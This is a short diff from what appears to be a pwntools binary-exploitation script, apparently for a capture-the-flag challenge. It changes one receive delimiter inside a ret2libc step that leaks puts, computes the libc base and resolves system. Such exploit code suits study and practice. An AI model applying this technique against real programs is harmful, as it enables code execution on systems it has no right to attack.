@@ -48,7 +48,7 @@ payload += p32(bss)
 p.send(payload)
 
 ##leak libc
-p.recvuntil(b'\n')
+p.recvuntil(b' \n')
 leak_data = u32(p.recv()[:4])
 libc_base = leak_data - libc.symbols['puts']
 system = libc_base + libc.symbols['system']
